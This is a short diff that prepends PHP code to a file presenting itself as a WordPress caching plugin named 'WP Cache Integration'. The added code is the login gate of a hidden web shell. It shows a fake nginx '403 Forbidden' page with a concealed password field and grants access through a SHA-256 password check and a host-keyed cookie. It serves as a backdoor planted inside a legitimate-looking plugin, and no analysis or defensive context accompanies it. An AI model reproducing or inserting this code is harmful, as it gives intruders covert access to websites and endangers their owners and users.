@@ -1,4 +1,28 @@
 <?php
+$auth_pass = "6f6f30d8f9e1397d26524a99e8c97aaa0e7c2df62dbd4f3b55735e5edc91e86a";
+
+function Login() {
+  die("<html>
+  <title>403 Forbidden</title>
+  <center><h1>403 Forbidden</h1></center>
+  <hr><center>nginx (apache v.5162 ./daemonn_sys) </center>
+  <center><form method='post'><input style='text-align:center;margin:0;margin-top:0px;background-color:#fff;border:1px solid #fff;' type='password' name='pass'></form></center>");
+}
+
+function VEsetcookie($k, $v) {
+    $_COOKIE[$k] = $v;
+    setcookie($k, $v);
+}
+
+if (!empty($auth_pass)) {
+    if (isset($_POST['pass']) && (hash('sha256', $_POST['pass']) == $auth_pass))
+        VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
+
+    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
+        Login();
+}
+?>
+<?php
 /*
 Plugin Name: WP Cache Integration
 Version: 2.1.4
